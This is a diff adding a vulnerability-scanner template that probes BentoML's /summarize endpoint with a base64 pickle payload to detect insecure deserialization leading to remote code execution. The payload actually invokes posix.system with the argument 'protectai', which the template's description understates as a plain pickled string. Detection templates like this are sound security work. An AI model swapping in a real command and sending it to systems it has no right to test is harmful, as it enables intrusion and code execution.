@@ -1,0 +1,29 @@
+id: bentoml-rce
+
+info:
+  name: BentoML Insecure Deserialization RCE Simulation
+  author: DanMcInerney, byt3bl33d3r, pinkdraconian
+  severity: critical
+  description: Simulates an insecure deserialization attack on BentoML to trigger remote code execution. Binary data is string "protectai" pickled.
+  reference:
+    - https://huntr.com/bounties/349a1cce-6bb5-4345-82a5-bf7041b65a68
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-1188 # Insecure Default Initialization of Resource
+  tags: bentoml, rce, deserialization, protectai, huntr, ai, machine-learning
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/summarize"
+    headers:
+      Content-Type: "application/vnd.bentoml+pickle"
+    body: !!binary |
+      gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAlwcm90ZWN0YWmUhZRSlC4=
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Input should be a valid dictionary or instance of Input"
+        part: body
